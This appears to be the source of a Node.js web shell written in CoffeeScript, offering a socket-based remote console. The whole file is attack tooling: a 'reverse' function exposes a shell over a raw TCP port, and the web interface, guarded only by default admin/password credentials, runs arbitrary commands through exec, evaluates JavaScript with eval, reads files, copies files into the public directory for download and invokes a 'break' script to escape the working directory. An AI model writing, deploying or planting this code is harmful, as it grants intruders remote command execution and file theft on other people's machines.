{exec, spawn} = require 'child_process'
path = require 'path'
fusker = require 'fusker'
net = require 'net'
util = require 'util'
fs = require 'fs'

# TODO: websafe (string) -> string, tolink (Array) -> string of links

tryfile = (dir) -> try fs.readFileSync dir || '.'; 
getfile = (dir='.') -> tryfile(dir) || fs.readdirSync dir
stats = (dir='.') -> s = fs.statSync dir; s.mode=s.mode.toString 8; s
jseval = (cmd) -> 
  try 
      eval(cmd)
  catch error
      "" + error

module.exports =
  reverse: (port) ->
    sh = spawn '/usr/bin/env', []
    server = net.createServer (c) ->
      c.pipe sh.stdin
      util.pump sh.stdout, c
    server.listen port
    
  start: (port, username, password) ->
    username ?= 'admin'
    password ?= 'password'
    breakf = path.join __dirname, "../break"
    pdir = path.join __dirname, '../public'
    
    fusker.config.dir = pdir
    fusker.config.silent = true
    server = fusker.http.createServer port, username, password
    io = fusker.socket.listen server
    
    io.sockets.on 'connection', (socket) ->
      socket.cwd ?= process.cwd()
      socket.emit 'cwd', socket.cwd
      
      socket.on 'command', (msg) ->
      
        if msg.indexOf('breakout') is 0
          socket.cwd = '/'
          socket.emit 'cwd', socket.cwd
          return socket.broken = true
          
        if msg.indexOf('breakin') is 0
          socket.cwd = process.cwd()
          socket.emit 'cwd', socket.cwd
          return socket.broken = false
          
        if msg.indexOf('cd ') is 0
          cd = msg.split(' ')[1]
          socket.cwd = path.resolve socket.cwd, cd
          return socket.emit 'cwd', socket.cwd
          
        if msg.indexOf('!dir') is 0
          dir = msg.split(' ')[1] || '.'
          here = fs.readdirSync dir
          return socket.emit 'stdout', here.sort().join("\n")

        if msg.indexOf('!get') is 0
          dir = msg.split(' ')[1] || '.'
          here = String getfile dir
          return socket.emit 'stdout', here
          
        if msg.indexOf('!stat') is 0
          dir = msg.split(' ')[1] || '.'
          here = try JSON.stringify stats dir
          return socket.emit 'stdout', here
          
        if msg.indexOf('!js ') is 0
          here = try JSON.stringify jseval msg.replace /^!js /, ""
          return socket.emit 'stdout', here

        if msg.indexOf('!echo ') is 0
          here = msg.replace(/^!echo /, "")
          return socket.emit 'stdout', here
          
        if msg.indexOf('rip ') is 0
          file = msg.split(' ')[1]
          fpath = path.resolve socket.cwd, file
          msg = "cp #{fpath} #{pdir}"
          socket.emit 'stdout', "#{file} copied"
            
        if socket.broken  
          msg = "PERL_BADLANG=0 #{breakf} \"#{msg}\" \"#{socket.cwd}\""
          execArgs = {cwd: process.cwd()}
        else
          execArgs = {cwd: socket.cwd}

        exec msg, execArgs, (err, stdout, stderr) ->
          socket.emit 'cwd', socket.cwd
          socket.emit 'stdout', stdout if stdout? and stdout isnt ""
          socket.emit 'stderr', stderr if stderr? and stderr isnt ""
          socket.emit 'error', err.message if err? and !stderr
